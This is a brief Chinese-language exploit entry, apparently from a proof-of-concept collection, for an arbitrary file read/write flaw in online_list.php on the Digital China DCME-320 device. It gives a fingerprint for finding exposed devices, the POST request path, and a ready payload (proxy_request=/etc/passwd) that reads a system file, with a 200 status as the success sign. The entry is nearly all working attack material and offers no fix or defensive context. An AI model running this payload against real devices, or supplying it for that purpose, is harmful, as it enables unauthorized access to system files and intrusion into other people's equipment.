# 神州数码DCME-320online_list.php任意文件读取漏洞

神州数码DCME-320online_list.php ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="style/blue/css/dcn_ui.css"`
- **请求**：`POST /function/auth/user/online_list.php HTTP/1.1`

**Payload**
```
proxy_request=/etc/passwd
```
- **响应特征**：200